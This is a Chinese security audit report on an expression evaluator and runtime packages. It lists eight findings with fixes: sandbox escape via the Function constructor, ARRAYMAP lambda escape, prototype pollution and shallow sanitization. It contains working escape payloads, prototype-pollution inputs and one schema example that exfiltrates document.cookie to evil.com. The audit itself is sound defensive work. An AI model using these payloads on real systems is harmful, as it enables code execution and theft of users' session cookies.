# 对抗性审查报告 — 2026-05-04 (第四轮: V2 恶意输入者 + V8 跨边界信使)

> 审查方式：按 `docs/skills/open-ended-adversarial-review-prompt.md` 执行。

---

## 视角选择

- **V2 恶意输入者** — 已有报告（05-04 第一轮、05-02）提到 `$JSON.parse` 和 `DANGEROUS_KEYS` 过滤，但未深入论证*完整的 sandbox 逃逸链*。本次重点验证 expression evaluator 是否存在可利用的逃逸路径。
- **V8 跨边界信使** — 未被深入使用。聚焦 formula→scope→props 的类型擦除和 sanitize 覆盖范围。

---

## 发现 1：Expression evaluator 可通过原型链到达 Function 构造器 (CRITICAL)

**在哪里**

- `packages/flux-formula/src/evaluator.ts:248-250`（member access）
- `packages/flux-formula/src/evaluator.ts:298`（function call with receiver）

**是什么**

Member access 使用 `(objectValue as any)[key]`，没有任何属性名黑名单。表达式可以通过原型链遍历到达 `Function` 构造器：

```
data.constructor.constructor("return globalThis")()
```

对于任何对象 `data`：

1. `data.constructor` → `Object`（或该对象的构造器）
2. `Object.constructor` → `Function`
3. `Function("return globalThis")()` → 全局对象

这等价于 `eval`，完全绕过了 formula evaluator 的沙箱。

**具体攻击场景**

如果 schema 来自 CMS 或用户配置：

```json
{
  "type": "text",
  "value": "${data.constructor.constructor('return fetch(\"https://evil.com/steal?cookie=\"+document.cookie)')()}"
}
```

**严重度**: CRITICAL  
**信心水平**: 确定 — 这是标准的 JavaScript 沙箱逃逸技术，代码路径无任何防护。

**递进深挖**：

1. 孤例还是模式？→ 模式。所有 member access 和 function call 路径都无防护。
2. 为什么出现？→ 项目假设 schema 来自可信来源，未将 expression evaluator 视为安全边界。
3. 修复方案：添加属性访问黑名单 (`__proto__`, `constructor`, `prototype`) 或使用 `Object.create(null)` 代理层阻断原型链。更彻底的方案：在 member access 时检查 `typeof result !== 'function'`（除非在注册的 namespace 上）。
4. 预防措施：如果 schema 可能来自低信任来源，必须在架构层面定义安全边界文档。

---

## 发现 2：ARRAYMAP lambda 内同样可逃逸 (CRITICAL)

**在哪里**

- `packages/flux-formula/src/evaluator.ts:177-191`（ArrowFunctionExpression）
- `packages/flux-formula/src/evaluator.ts:298`（callable.fn.apply）

**是什么**

Arrow function 在 evaluator 中创建闭包，其参数绑定到 frame 中。在 lambda 内部，可以对参数执行与发现 1 相同的原型链遍历：

```
ARRAYMAP([1], x => x.constructor.constructor("return globalThis")())
```

`x` 是数字 `1`，`x.constructor` → `Number`，`Number.constructor` → `Function`，逃逸。

**严重度**: CRITICAL  
**信心水平**: 确定。

---

## 发现 3：Object 字面量的 `__proto__` key 设置原型 (HIGH)

**在哪里**

- `packages/flux-formula/src/evaluator.ts:160-170`（ObjectExpression）

**是什么**

```typescript
const result: Record<string, unknown> = {};
for (const property of node.properties) {
  const key = evaluateNode(property.key, frame);
  result[String(key)] = evaluateNode(property.value, frame);
}
```

当 key 为 `"__proto__"` 时，对普通对象 `{}` 赋值 `result["__proto__"] = {...}` 会通过 `Object.prototype.__proto__` setter 修改对象的原型。攻击者可以创建带有恶意原型的对象。

**具体攻击**

表达式 `{["__proto__"]: {isAdmin: true}}` 创建一个原型被替换的对象。如果该对象进入 scope 并与其他数据 merge/spread，`isAdmin` 属性会通过原型链泄漏到所有继承对象。

**修复方案**: 使用 `Object.create(null)` 代替 `{}` 创建 result，或对 key 做 `__proto__` 过滤。

**严重度**: HIGH  
**信心水平**: 确定 — 这是已知的 JavaScript 行为。

---

## 发现 4：`$JSON.parse` 结果可包含深层原型污染 (HIGH)

**在哪里**

- `packages/flux-formula/src/builtins.ts:51`（`registerNamespace('$JSON', JSON)`）
- `packages/flux-runtime/src/scope.ts:89-109`（`sanitizeSnapshot` 只检查顶层 key）

**是什么**

`$JSON.parse('{"a": {"__proto__": {"polluted": true}}}')` 返回的对象在深层包含 `__proto__` key。`sanitizeSnapshot` 只检查顶层 key（`Object.keys(data)` 遍历），不递归 sanitize 嵌套对象。通过 `setIn` 写入 scope 时，嵌套的 `__proto__` 原样保留。

**严重度**: HIGH  
**信心水平**: 中高 — 取决于 parse 结果如何流入 scope。如果通过 action `set` 写入，`isDangerousPathHead` 只检查路径第一段。

---

## 发现 5：`setIn` 公共工具无内部路径 sanitization (MEDIUM)

**在哪里**

- `packages/flux-core/src/utils/path.ts:111-117`

**是什么**

`setIn(obj, "__proto__.polluted", true)` 会直接操作 `obj.__proto__`（通过 prototype setter）写入 `polluted` 属性，实现 prototype pollution。虽然 `scope.ts` 的 `update()` 方法有 `isDangerousPathHead` 守卫，但 `setIn` 作为 `flux-core` 的公开导出 utility，其他包可以不经守卫直接调用。

**严重度**: MEDIUM  
**信心水平**: 确定 — 代码无 sanitize 逻辑。实际利用需要找到绕过 scope 守卫的调用路径。

---

## 发现 6：`sanitizeSnapshot` 仅浅层检查 (MEDIUM)

**在哪里**

- `packages/flux-runtime/src/scope.ts:89-109`

**是什么**

`sanitizeSnapshot` 仅遍历 `Object.keys(data)` 检查顶层 key 是否为 `__proto__`/`constructor`/`prototype`。嵌套对象内的危险 key 完全不处理。这意味着任何能向 scope 写入深层对象的路径（action set、`$JSON.parse` 结果、API response）都可以注入未 sanitize 的原型污染载荷。

**严重度**: MEDIUM  
**信心水平**: 确定。

---

## 发现 7：Formula→Scope→Props 全链路无运行时类型验证 (MEDIUM)

**在哪里**

- `packages/flux-formula/src/evaluator.ts:115`（返回 `unknown`）
- `packages/flux-runtime/src/scope.ts`（store 为 `Record<string, any>`）
- `packages/flux-core/src/types/renderer-core.ts:101`（`RendererResolvedProps = Record<string, any>`）

**是什么**

Formula 可以返回任何类型（Function、Symbol、Proxy 等）。这个值不经类型检查进入 scope，再不经检查传递给 renderer props。如果 formula 意外返回 Function 对象（如通过 `data.constructor` 访问），renderer 可能将其渲染为 `[object Function]` 或尝试将其作为 React node 处理。

**严重度**: MEDIUM（通常是 UX bug 而非安全问题，但结合发现 1 可以传递恶意 function）  
**信心水平**: 确定 — 无任何类型边界守卫。

---

## 发现 8：Renderer type 字段无格式验证 (LOW)

**在哪里**

- `packages/flux-compiler/src/schema-compiler.ts:119`

**是什么**

`item.type` 用于 registry lookup，未知 type 会 throw。但 type 值原样存储在编译后的 `TemplateNode.type` 中。如果下游代码在 HTML attribute 或 DOM 操作中使用 `node.type` 而不转义，可能构成 XSS 向量。当前代码中未发现直接利用路径，属于 defense-in-depth 缺口。

**严重度**: LOW  
**信心水平**: 中 — 需要下游误用配合。

---

## 总评

### 最值得关注的方向

1. **Expression evaluator 需要属性访问黑名单或 Proxy-based sandbox** — 发现 1 和 2 是 CRITICAL 级别的 sandbox 逃逸。如果项目有任何场景 schema 来自低信任来源（CMS、用户配置、第三方插件），必须立即修复。修复选项：
   - 最小：黑名单 `constructor`、`__proto__`、`prototype` 在 member access 时
   - 推荐：对所有非 namespace 对象的 member access 返回值做 `typeof !== 'function'` 检查
   - 最彻底：使用 Proxy 包装所有用户数据，拦截危险属性

2. **深层 sanitization** — `sanitizeSnapshot` 需要递归或使用 `JSON.parse` reviver 过滤危险 key。`setIn` 需要对路径段做 sanitization。

3. **定义安全边界文档** — 项目需要明确声明 expression evaluator 的 threat model：schema 是否被视为可信输入？如果是，以上发现是 accepted risk；如果不是，需要 sandbox 加固。

### 盲区自评

- 未检查 `registerNamespace` 注册的其他对象（除 Math/JSON/dateHelper 外）是否有危险方法。
- 未检查 template 字符串插值 (`${...}`) 的解析是否有注入向量。
- 未验证 API response data 进入 scope 的完整路径是否经过 sanitize。
- 未检查 SSR 场景下这些逃逸是否能访问 Node.js API（如 `require`、`process`）。

**建议下次视角**：V10（死代码清道夫）+ V4（异常路径侦探）。
